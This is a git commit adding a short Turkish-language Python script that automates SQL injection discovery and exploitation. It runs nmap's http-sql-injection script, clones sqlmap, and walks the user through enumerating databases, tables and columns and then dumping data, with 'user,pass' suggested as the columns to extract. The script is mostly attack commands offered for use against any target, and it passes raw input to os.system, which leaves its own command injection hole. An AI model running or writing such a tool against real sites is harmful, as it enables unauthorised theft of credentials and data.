59786df98182ef3db59203f9c5a8f3ac83b33692
ZoRRaKin <105127547+ZoRRaKin0@users.noreply.github.com>
2022-07-14 14:43:10 +0300

    Add files via upload

---
+++ oto-sqlmap.py
@@ -0,0 +1,79 @@
+#coded by ZoRRaKiN
+
+import os
+
+os.system("pkg install git -y")
+os.system("pkg install figlet -y")
+os.system("pkg install nmap -y")
+os.system("clear")
+os.system("figlet SQL ACIGI VE ISTISMARI")
+
+print("""
+Bu Araç SQL Injection güvenlik açığı tespiti ve istismarı için, nmap ve sqlmap araçlarını kullanır. 				
+
+1) SQL Açığı Tespiti
+2) SQL Açığı İstismarı
+
+
+""")
+
+secim = input("Seçim : ")
+	
+if(secim=="1"):
+	hedef = input("Hedef Domain : ")
+	os.system("clear")
+	os.system("nmap -sV --script=http-sql-injection " + hedef)
+	
+elif(secim=="2"):
+	os.system("git clone https://github.com/sqlmapproject/sqlmap.git")
+	os.system("clear")
+	os.system("figlet SQL ISTISMAR")
+	print("""
+	Burdan ise v.tabanı,tablo,kolon ve bilgileri çek yapacaksınız başarılar :)
+	
+	1) Veritabanı Öğren
+	2) Tablo Öğren
+	3) Kolon Öğren
+	4) Bilgileri Çek
+ 
+	""")
+	
+	secim = input("Seçim : ")
+	
+	if(secim=="1"):
+		link = input("Link : ")
+		os.system("cd sqlmap/ && python sqlmap.py -u " + link + " --dbs --batch")
+		
+	elif(secim=="2"):
+		link = input("Link : ")
+		veritabani = input("Veritabanı Adı : ")
+		os.system("cd sqlmap/ && python sqlmap.py -u " + link + " -D " + veritabani + " --tables --batch")
+		
+	elif(secim=="3"):
+		link = input("Link : ")
+		veritabani = input("Veritabanı Adı : ")
+		tablo = input("Tablo : ")
+		os.system("cd sqlmap/ && python sqlmap.py -u " + link + " -D " + veritabani + " -T " + tablo + " --columns --batch")
+		
+	elif(secim=="4"):
+		link = input("Link : ")
+		veritabani = input("Veritabanı Adı : ")
+		tablo = input("Tablo : ")
+		kolon = input("Kolon (user,pass) : ")
+		os.system("cd sqlmap/ && python sqlmap.py -u " + link + " -D " + veritabani + " -T " + tablo + " -C " + kolon + " --dump --batch")		
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
